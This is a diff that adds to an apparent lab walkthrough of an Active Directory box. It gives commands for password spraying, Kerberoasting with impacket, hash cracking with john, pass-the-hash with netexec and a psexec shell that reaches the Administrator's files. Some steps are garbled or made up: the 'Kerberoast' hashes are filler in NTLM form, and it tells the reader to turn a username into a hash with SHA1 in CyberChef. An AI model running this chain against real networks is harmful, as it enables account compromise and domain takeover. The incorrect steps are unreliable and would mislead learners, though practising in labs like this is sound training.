@@ -111,3 +111,111 @@ o
 ## so the objectif is to try out all the username with a password same as the username to see if we can find any valid credentials.
 
 command : netexec smb \\<IP_ADDRESS>\ -u user.txt -p user1.txt --no-bruteforce | grep -v FAILURE
+
+
+we got one that match  user = ybob317 password = ybob317 in SOUPEDECODE.LOCAL domain
+using this credentials we can try to access the smb shares again to see if we can find any useful information there.
+
+
+command: smbclient -L /<IP_ADDRESS> -U 'SOUPEDECODE.LOCAL\ybob317'
+when prompted for the password we give ybob317
+
+no shares really interesting we have a shares Users in there we gonna try accessing it
+
+command : smbclient -L //ip_address>/Users -U 'SOUPEDECODE.LOCAL\ybob317'
+when prompted for the password we give ybob317
+
+
+
+we get inside and see the users we found going inside his folder we can find the users.txt inside /desktop
+
+inside a share use command :  more user.txt  to print it
+and :q to quit the mode
+
+
+
+the next Step :
+
+
+
+using impacket-GetUserSPNS.py to enumerate the SPN to find any service account that we can use to perform pass the hash attack
+
+
+command : impacket-GetUserSPNS SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip <IP_ADDRESS> -request
+
+
+we get a lot of hash for a lot of service
+
+ftp/fileserver
+fw/proxyserver
+http/backupServer
+http/Webserver
+https/monitoringserver
+
+
+
+putting all the file inside a text i named hash.txt 
+
+like this as a exemple fileserver:SOUPDECODE.LOCAL$@aad3b435b51404eeaad3b435b51404ee:bbf7e5f4c2d6c6f4e8f4e8f4e8f4e8f4
+proxyserver:SOUPDECODE.LOCAL$@aad3b435b514
+
+
+
+we use john to do some decryption
+command :  john hash.txt -w=/usr/share/wordlists/rockyou.txt
+and we get one password for the file_svc
+
+
+
+we then reconnect to smb
+command : smbclient -L //<IP_ADDRESS>/ -U 'SOUPEDECODE.LOCAL\file_svc'
+when prompted for the password
+and we see the share backup that we said earlier we have read access to it
+
+
+we reconnect using smbclient
+command : smbclient //<IP_ADDRESS>/backup -U 'SOUPEDECODE.LOCAL\file_svc'
+
+and we do a get command 
+command : get backup.extract.txt
+
+we get a username:uid:hash type file so we have to get everythings alone the hash and the users
+
+using this command 
+
+command : cat backup.extract.txt | cut -d ':' -f 1 > backup.users.txt
+
+and
+
+command : cat backup.extract.txt | cut -d ':' -f 4 | awk '{print "00000000000000000000000000000000:"$1}' > backup.hashes. //some windows stuff
+
+we do the same with netexec try to see if a username use the same ass password hashes 
+this is the pass the hash method
+
+
+netexec smb //ip adress -u backup.user.txt -H backup.hashes.txt
+-H = to pass a hash
+
+
+and we got a match the fileserver match one of the hash
+
+
+so we got a hash and a username right now to use impacket-psexec we have to transform the username to hash go to cyberchef and transform the username to hash using sha1
+
+
+exemple : 
+username = SOUPEDECODE.LOCAL\FileServer$
+password = some hash
+
+
+send the username to cyberchef and try the impacket command here
+
+
+
+command = impacket-psexec 'FileServer$@/ipadress' -hashes 'hash_of_the_username:password_hash_that_match'
+
+and we get inside seing a little windows terminale we navigate throug ../../Users/Administrators/Desktop
+and we got the root.txt
+
+
+Congrat!!!!!
